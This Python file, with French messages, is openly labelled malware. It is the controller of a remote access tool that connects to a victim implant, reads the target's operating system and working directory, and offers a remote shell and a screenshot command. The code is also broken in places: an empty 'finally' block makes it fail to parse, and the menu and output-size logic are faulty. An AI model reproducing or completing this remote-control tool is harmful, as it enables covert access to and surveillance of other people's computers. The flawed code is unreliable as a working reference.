import os, sys, platform, socket
from threading import Thread, Event


#CONSTANTES
BUFFERSIZE=2048
ENCODING = 'UTF-8'

class Malware():

    def __init__(self):
        self.ip = 'localhost'
        self.port = 50001
        self.s = socket.socket()



    def connection(self):
        try:
            self.s.connect((self.ip, self.port))
        except socket.timeout:
            self.disconnect()
            print("[!] Aucune réponse du client.")
        except:
            self.disconnect()
            print("[!] Erreur lors de la connexion.")

    def disconnect(self):
        self.s.close()

    def run(self):

        print("En attente de connexion avec :" + self.ip)
        self.connection()
        print("Connexion etablie")

        print("Recherche le systeme d'exploitation de la cible")
        self.getOperatingSystem()

        print("Recuperation du repertoire courant...")
        cwd = self.getCurrentWorkingDirectory() #cwd : Current Working Directory


        act = self.menu()
        while act != '0':
            self.task(act, cwd)
            act = self.menu()



    def menu(self):
        choix = -1
        while choix < 0 or choix > 3:
            print("0 : Quitter l'application")
            print("1 : Obtenir des informations")
            print("2 : Shell")
            print("3 : PrtScr")
            print(choix)
            choix = int(input(":"))
        return choix

    def task(self, act, cwd):


        if act == 2:
            cmd = input(cwd+'>')
            while cmd != 'exit()':
                shell = Shell(cmd, self.s, cwd)
                if cmd[:2] == 'cd':
                    shell.changeCurrentDirectory()
                else:
                    shell.sendCmd()
                cwd = self.getCurrentWorkingDirectory()
                cmd = input(cwd + '>')





    def getOperatingSystem(self):
         cmd = 'os'
         try:
            self.s.send((cmd).encode(ENCODING))
         except:
             print("Recuperation du systeme d'exploitation échoué")
         finally:
            operatingSystem = self.s.recv(BUFFERSIZE).decode(ENCODING)
            print ("Le système d'exploitation est un : "+operatingSystem)


    def getCurrentWorkingDirectory(self):
        cmd = 'cwd'
        try:
            self.s.send((cmd).encode(ENCODING))
        except:
            print("Recuperation du repertoire courant échoué")
        finally:
            cwd = self.s.recv(BUFFERSIZE).decode(ENCODING)
            print('[DEBUG] Receive CWD >',cwd)
            return cwd


    def PrtScr(self):
        cmd = 'prtscr'
        try:
            self.s.send((cmd).encode(ENCODING))
        except:
            print("Capture d'écran échoué")
        finally:




class Shell():
    def __init__(self, cmd: str, s, cwd):
        self.cmd = cmd
        self.s = s
        self.cwd = cwd

    def sendCmd(self):
        self.s.send((self.cmd).encode(ENCODING))
        result = self.s.recv(1024).decode(ENCODING)
        total_size = len(result[:16])
        result = result[16:]

        while total_size > len(result):
            data = self.s.recv(1024).decode(ENCODING)
            result += data

        print(result)
        print("\n")

    def changeCurrentDirectory(self):
        self.s.send((self.cmd).encode(ENCODING))



go = Malware()
go.run()